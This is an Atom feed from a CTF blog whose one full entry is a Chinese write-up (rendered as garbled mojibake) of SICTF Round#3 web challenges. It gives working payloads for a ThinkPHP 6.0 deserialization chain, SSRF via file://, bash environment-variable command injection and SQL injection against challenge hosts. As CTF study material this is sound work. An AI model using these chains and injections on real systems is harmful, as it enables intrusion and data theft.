<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p0l1st&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-02-20T05:59:33.923Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>p0l1st</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SICTF Round#3 Webéƒ¨åˆ†wp</title>
    <link href="http://example.com/2024/02/19/SICTF-Round-3-Web%E9%83%A8%E5%88%86wp/"/>
    <id>http://example.com/2024/02/19/SICTF-Round-3-Web%E9%83%A8%E5%88%86wp/</id>
    <published>2024-02-19T02:01:29.000Z</published>
    <updated>2024-02-20T05:59:33.923Z</updated>
    
    <content type="html"><![CDATA[<h1 id="100ï¼…-upload"><a href="#100ï¼…-upload" class="headerlink" title="100ï¼…_upload"></a>100ï¼…_upload</h1><p>æ‰“å¼€ç¯å¢ƒå‘ç°æ–‡ä»¶åŒ…å«</p><p><img src="/../images/image-20240218201755319.png" alt="image-20240218201755319"></p><p>é¢˜ç›®æç¤ºä¸èƒ½ä¸Šä¼ phpæ–‡ä»¶ï¼Œç›´æ¥ä¼ ä¸€ä¸ªå›¾ç‰‡é©¬</p><p><img src="/../images/image-20240218202359704.png" alt="image-20240218202359704"></p><p>RCE</p><p><img src="/../images/image-20240218202519654.png" alt="image-20240218202519654"></p><h1 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">client</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        <span class="variable">$payload</span> = <span class="string">&quot;system(\&quot;cat /flag\&quot;);&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Exploit&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// hint:hide other file</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Harder&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Harder&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You don&#x27;t know how to pass parameters?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>flagåœ¨html&#x2F;flag.php</p><p>æ„é€ exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">client</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>=<span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">client</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;client&quot;:2:&#123;s:3:&quot;url&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;s:7:&quot;payload&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>base64è§£ç </p><p><img src="/../images/image-20240218202938028.png" alt="image-20240218202938028"></p><p><img src="/../images/image-20240218202946529.png" alt="image-20240218202946529"></p><h1 id="Oyst3rPHP"><a href="#Oyst3rPHP" class="headerlink" title="Oyst3rPHP"></a>Oyst3rPHP</h1><p><a href="http://www.zipä¸‹è½½æºç ä»£ç å®¡è®¡/">www.zipä¸‹è½½æºç ä»£ç å®¡è®¡</a></p><p>thinkphp6.0</p><p><img src="/../images/image-20240218203202526.png" alt="image-20240218203202526"></p><p>index.php GETä¼ å‚leftå’Œrightå¼±æ¯”è¾ƒï¼ŒPOSTä¼ å‚keyåˆ©ç”¨prceå›æº¯ç»•è¿‡ï¼Œå¹¶ä¸”payloadå­˜åœ¨ååºåˆ—åŒ–</p><p><img src="/../images/image-20240218203240920.png" alt="image-20240218203240920"></p><p>Model.phpï¼Œå‘ç°flagæ‰€åœ¨æ–‡ä»¶</p><p><img src="/../images/image-20240218203556909.png" alt="image-20240218203556909"></p><p>ç›´æ¥ç”¨tp6.0çš„é“¾å­æ‰“ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;cat /Oyst3333333r.php&quot;</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lazySave</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$force</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&quot;&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$obj</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;a&#x27;</span> * <span class="number">1000000</span>+<span class="string">&#x27;603THINKPHP&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;payload&#x27;</span>:<span class="string">&quot;TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://yuanshen.life:38972/?left=QNKCDZO&amp;right=240610708&#x27;</span>, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240218204013287.png" alt="image-20240218204013287"></p><h1 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">begin0fweb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">begin0fweb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$p</span>=<span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;welcome-&gt;you = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;  Welcome to new year!  &#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;year);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/worries/i&#x27;</span>,<span class="variable">$this</span>-&gt;newyear))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;empty it!&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(worries).*$/&#x27;</span>,<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Don\&#x27;t be worry&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Worries doesn\&#x27;t exists in the new year  &#x27;</span>;</span><br><span class="line">            <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;last-&gt;worries);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>] <span class="keyword">as</span> <span class="variable">$inject</span> =&gt; <span class="variable">$rce</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$inject&#125;</span>=<span class="subst">&#123;$rce&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo \&quot;Haven&#x27;t you get the secret?\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;go&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;go&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–æœ€ç»ˆè§¦å‘putenv()ï¼Œè¿™é‡Œå’Œè™ç¬¦CTFçš„ezphpå¾ˆåƒï¼Œä½†æ˜¯æç¤ºè¯´äº†RUN ln -sf &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;shï¼Œé‚£ä¹ˆsystemè°ƒç”¨çš„å°±æ˜¯bash -cï¼Œä¸pğŸ‚çš„ç¯å¢ƒå˜é‡æ³¨å…¥å°±ä¸€æ ·äº†ï¼Œç›´æ¥åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œå‘½ä»¤</p><p>ååºåˆ—åŒ–é“¾ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>=<span class="string">&quot;Worries&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">start</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SE</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CR</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ET</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;year=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;last=<span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXb3JyaWVzIjt9fXM6MzoieW91IjtOO30=</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://yuanshen.life:38989/?get[BASH_FUNC_echo%25%25]=()%20&#123;%20cat /f*;%20&#125;</span><br><span class="line">POST:</span><br><span class="line">go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXb3JyaWVzIjt9fXM6MzoieW91IjtOO30=</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240218204623551.png" alt="image-20240218204623551"></p><h1 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h1><p>æ— åˆ—åæ³¨å…¥ï¼Œè¿‡æ»¤ç©ºæ ¼ï¼Œä½¿ç”¨&#x2F;**&#x2F;ä»£æ›¿</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union/**/select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flag)a%23</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240220110233228.png" alt="image-20240220110233228"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;100ï¼…-upload&quot;&gt;&lt;a href=&quot;#100ï¼…-upload&quot; class=&quot;headerlink&quot; title=&quot;100ï¼…_upload&quot;&gt;&lt;/a&gt;100ï¼…_upload&lt;/h1&gt;&lt;p&gt;æ‰“å¼€ç¯å¢ƒå‘ç°æ–‡ä»¶åŒ…å«&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/../im</summary>
      
    
    
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>uzipè½¯é“¾æ¥getshell</title>
    <link href="http://example.com/2024/02/06/uzip%E8%BD%AF%E9%93%BE%E6%8E%A5getshell/"/>
    <id>http://example.com/2024/02/06/uzip%E8%BD%AF%E9%93%BE%E6%8E%A5getshell/</id>
    <published>2024-02-06T11:11:28.000Z</published>
    <updated>2024-02-06T11:32:24.962Z</updated>
    
